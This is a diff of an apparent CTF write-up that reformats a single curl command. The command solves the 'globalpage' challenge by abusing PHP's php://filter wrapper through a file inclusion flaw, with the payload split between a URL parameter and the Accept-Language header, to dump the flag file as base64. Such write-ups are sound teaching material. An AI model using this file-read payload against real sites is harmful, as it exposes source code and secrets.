@@ -69,7 +69,10 @@ tags:
 
 <span style="font-size: 12pt;">By the way, you can also solve it the &#8220;Curl&#8221; way:</span>
 
-<pre class="lang:sh decode:true">curl 'http://globalpage.chal.ctf.westerns.tokyo/?page=php:' -H "Accept-Language:/filter/convert.base64-encode/resource=flag"</pre>
+```sh
+curl 'http://globalpage.chal.ctf.westerns.tokyo/?page=php:' -H "Accept-Language:/filter/convert.base64-encode/resource=flag"
+```
+
 
 &nbsp;
 
